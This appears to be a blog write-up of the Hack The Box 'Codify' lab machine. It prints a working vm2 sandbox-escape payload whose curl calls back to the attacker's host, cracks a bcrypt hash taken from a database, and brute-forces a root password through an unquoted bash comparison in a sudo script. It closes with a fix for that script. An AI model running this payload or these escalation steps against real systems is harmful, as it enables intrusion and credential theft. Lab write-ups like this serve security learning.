---
layout: post
title: "HTB: Codify"
author: Andrew Cherney
date: 2024-04-12 02:18:08
tags: htb easy-box bash javascript custom-code linux cve
icon: "assets/icons/codify.png"
post_description: "Foothold for this box begins with a sandbox escape through error messages which can then be used to sift through a database for user credentials. A bash script can then be abused to fuzz the root password with a custom bash script."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Codify]
└──╼ $nmap -sC 10.10.11.239
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-11 10:51 CST
Nmap scan report for 10.10.11.239
Host is up (0.050s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  ppp
```

An odd port to be sure. In looking up what services or protocols use this port I found some development frameworks such as react and ruby on rails, we'll toss out a curl to check if it responds to Get requests.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Codify]
└──╼ $curl 10.10.11.239:3000
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Codify</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-light bg-light">
        <a class="navbar-brand" href="#">Codify</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
          <ul class="navbar-nav">
            <li class="nav-item">
              <a class="nav-link" href="/about">About us</a>
            </li>
          </ul>
        </div>
      </nav>
    <div class="container my-4">
        <div class="jumbotron text-center">
            <h1 class="display-4">Codify</h1>
            <p class="lead">Test your Node.js code easily.</p>
            <hr class="my-4">
            <p>This website allows you to test your Node.js code in a sandbox environment. Enter your code in the editor and see the output in real-time.</p>
            <a class="btn btn-primary btn-lg" href="/editor" role="button">Try it now</a>
          </div>
          
        <p>Codify is a simple web application that allows you to test your Node.js code easily. With Codify, you can write and run your code snippets in the browser without the need for any setup or installation.</p>
        <p>Whether you're a developer, a student, or just someone who wants to experiment with Node.js, Codify makes it easy for you to write and test your code without any hassle.</p>
        <p>Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system. Therefore this has some <a href="/limitations">limitations</a>. We try our best to reduce these so that we can give you a better experience.</p>
        <p>So why wait? Start using Codify today and start writing and testing your Node.js code with ease!</p>
    </div>
</body>
</html>
```

An application to test code? I smell a sandbox escape.

# User as svc

## CVE-2023-30547

![front page](/img/codify/codify_front_page.png)

![about us](/img/codify/codify_about_us.png)

In my first glance at a search for vulnerabilities I came across two CVES, [CVE-2023-30547](https://github.com/advisories/GHSA-ch3r-j5x3-6q2m) and [CVE-2023-29017](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv). I tested the latter and came across a few issues such as child_process being filtered. The former is a vuln more elaborated [in this hacker news post](https://thehackernews.com/2022/10/researchers-detail-critical-rce-flaw.html). The TLDR is this version gives the sandbox permissions to override the error object and then call it, which will cause the new implementation to access objects outside of the sandbox. [https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) is a specific post on the matter in the wild, and it contains a payload I intend to use.

```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl 10.10.14.7:8080');
}
`

console.log(vm.run(code));
```

We'll use a simple curl back to my host to check if this can reach me and works. 

![RCE](/img/codify/codify_rce.png)

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Codify]
└──╼ $httpserver 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.239 - - [11/Nov/2023 11:16:44] "GET / HTTP/1.1" 200 -
```

Excellent we have RCE. I enumerate around and find we are the svc user with our own home directory. So I generate a keypair and make an authorized_keys file to get a foothold.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Codify]
└──╼ $ssh svc@10.10.11.239 -i svc_key
The authenticity of host '10.10.11.239 (10.10.11.239)' can't be established.
ECDSA key fingerprint is SHA256:uw/jWXjXA/tl23kwRKzW+MkhMkNAVc1Kwwlm8EnJrqI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.239' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

...

svc@codify:~$
```

# User as joshua

## Database creds

When looking at the other directories in /var/www I came across Contact. Within it there is a database file in addition to some other shell of a support page. In that database file is a bcrypt password hash for joshua.

```bash
svc@codify:/var/www/contact$ cat tickets.db 
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��	tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Codify]
└──╼ $john joshpass --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)
1g 0:00:00:28 DONE (2023-11-11 11:34) 0.03547g/s 48.52p/s 48.52c/s 48.52C/s crazy1..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Codify]
└──╼ $ssh joshua@10.10.11.239
joshua@10.10.11.239's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov 11 05:35:35 PM UTC 2023

  System load:                      0.0224609375
  Usage of /:                       69.1% of 6.50GB
  Memory usage:                     26%
  Swap usage:                       0%
  Processes:                        237
  Users logged in:                  1
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.239
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:8886


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


joshua@codify:~$ groups
joshua
joshua@codify:~$ cat user.txt
b0ae3428935d--------------------
```

# Root

## sudo perms

```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

The logic for this script is to ask for a password, compare it, then backup the database. The comparison that takes place does not compare the string itself to the other string, as in the case of an asterisk it can produce a positive result without knowledge of the password.

```bash
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```

We can use a simple fuzzing script to iterate through every option adding * to the end to find out the password here. [This basic brute forcing script](https://github.com/CyberCherney/random_scripts/blob/main/hacking/htb_exploits/bashscriptpasswordbrute.py) is what I wrote and used. 

```bash
joshua@codify:~$ python3 exploit.py 
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
```

```bash
joshua@codify:~$ su
Password: 
root@codify:/home/joshua# cat /root/root.txt
d68e71b-------------------------
```


# Fixing The Script

The script in question can be tweaked to actually compare the string you enter to the password string. To do this place quotes around the actual if statement variable, and 

```bash
#!/bin/bash

DB_PASS="23412341234"
USER_PASS="*"

if [[ $DB_PASS == "$USER_PASS" ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```

```bash
raccoon@TheTrashBin:~$ bash test.sh 
Password confirmation failed!
```

